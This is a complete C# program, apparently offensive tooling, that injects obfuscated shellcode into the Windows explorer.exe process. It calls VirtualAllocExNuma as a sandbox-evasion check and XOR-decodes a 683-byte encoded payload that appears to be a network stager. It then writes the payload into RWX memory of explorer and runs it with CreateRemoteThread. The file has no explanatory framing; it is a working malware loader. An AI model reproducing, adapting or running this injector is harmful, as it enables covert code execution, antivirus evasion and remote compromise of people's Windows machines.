using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
            byte[] buf = new byte[683] {
 0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
 0xb2, 0xcb, 0x28, 0xab, 0xac, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2,
 0xb2, 0x71, 0xa8, 0xda, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0, 0xb7, 0xcb, 0x33, 0xb2, 0x71,
 0x88, 0xaa, 0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b,
 0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0xbb, 0xab,
 0x71, 0xb8, 0xc6, 0xb2, 0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f,
 0x88, 0xfa, 0xfa, 0xfa, 0x71, 0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e,
 0x9d, 0xb2, 0xfb, 0x2a, 0xaa, 0x71, 0xb2, 0xe2, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb,
 0x2a, 0x19, 0xac, 0xb2, 0x05, 0x33, 0xb7, 0xcb, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2,
 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33, 0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2,
 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf, 0xc3, 0x2b, 0x8f, 0x22, 0xa2,
 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71, 0xf6, 0xb2, 0xbe, 0x71,
 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2, 0xbb, 0xa2, 0xb2,
 0xfb, 0x2a, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2, 0x79, 0x16,
 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13, 0xb1,
 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93,
 0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d,
 0xdc, 0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a,
 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa,
 0xfa, 0x05, 0x2f, 0x12, 0xf4, 0xfa, 0xfa, 0xfa, 0xcb, 0xc3, 0xc8, 0xd4, 0xcb, 0xcc,
 0xc2, 0xd4, 0xce, 0xc3, 0xd4, 0xcd, 0xc3, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d,
 0x3a, 0x41, 0xfb, 0xfa, 0xfa, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3,
 0x40, 0xad, 0x73, 0x65, 0x3c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x7b, 0xfa,
 0xfa, 0xfa, 0xd5, 0x92, 0xc2, 0xb7, 0xbf, 0x9b, 0xb5, 0xcb, 0x98, 0x99, 0x98, 0xb5,
 0x90, 0xb5, 0xcc, 0xb3, 0xcf, 0x8d, 0x95, 0xc2, 0xa3, 0xb0, 0x8d, 0xb7, 0xa0, 0x89,
 0x89, 0x8d, 0xa5, 0xd7, 0xcb, 0x92, 0x89, 0xbb, 0x9b, 0xc9, 0xb1, 0xae, 0x92, 0xa8,
 0x91, 0x90, 0x88, 0xa3, 0xb5, 0xaf, 0xb0, 0xaf, 0xa8, 0x90, 0x80, 0xc2, 0x82, 0xae,
 0x92, 0x93, 0x82, 0xb5, 0x8e, 0xce, 0x9d, 0x92, 0xbd, 0xa8, 0xa8, 0xa9, 0xca, 0xac,
 0x8a, 0x96, 0xa8, 0x91, 0xab, 0xb4, 0x8e, 0xc9, 0x93, 0xbf, 0xc3, 0x91, 0xc3, 0xcc,
 0xc2, 0x96, 0x89, 0xaf, 0xcd, 0xc8, 0xcb, 0xad, 0x95, 0x8f, 0xb3, 0xa0, 0xb8, 0xbd,
 0xc8, 0x90, 0xac, 0x8b, 0x8a, 0x80, 0xb6, 0xa9, 0xa2, 0x9e, 0x8c, 0x88, 0xa0, 0x82,
 0xc9, 0x80, 0xa3, 0xc8, 0x9d, 0x89, 0x9b, 0x82, 0xcf, 0xcb, 0xac, 0x93, 0xbd, 0x83,
 0xae, 0xbc, 0xb8, 0xa3, 0xfa, 0xb2, 0x73, 0x3b, 0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb,
 0x33, 0xa9, 0xb2, 0x42, 0xfa, 0xc8, 0x52, 0x7e, 0xfa, 0xfa, 0xfa, 0xfa, 0xaa, 0xa9,
 0xa9, 0xb3, 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 0xb2, 0x73, 0x3c, 0x90,
 0xf0, 0xa5, 0xb2, 0x73, 0x0b, 0x90, 0xe5, 0xa0, 0xa8, 0x92, 0x7a, 0xc9, 0xfa, 0xfa,
 0xb3, 0x73, 0x1a, 0x90, 0xfe, 0xbb, 0xa3, 0xb3, 0x40, 0x8f, 0xbc, 0x64, 0x7c, 0xfa,
 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb7, 0xcb, 0x3a, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7,
 0xcb, 0x33, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81,
 0x05, 0x2f, 0x7f, 0x3a, 0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3,
 0x40, 0xbe, 0x0a, 0xcf, 0x1a, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35,
 0x8e, 0xf8, 0x11, 0x50, 0x12, 0xaf, 0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0,
 0xb3, 0x73, 0x2b, 0x3b, 0x18, 0xea, 0xb3, 0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3,
 0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9,
 0xa9, 0xb2, 0x73, 0x1d, 0xb2, 0x73, 0x0b, 0xb2, 0x73, 0x20, 0xb3, 0x3d, 0x3a, 0xfa,
 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03, 0xb3, 0x40, 0xe8, 0x6c, 0x73, 0x18, 0xfa, 0xfa,
 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda, 0x7f, 0x3a, 0x8e, 0x48, 0x9c, 0x71,
 0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2, 0x39, 0xa2, 0x90, 0xfa, 0xa3,
 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05, 0x2f };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            int size = buf.Length;
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        }
    }
}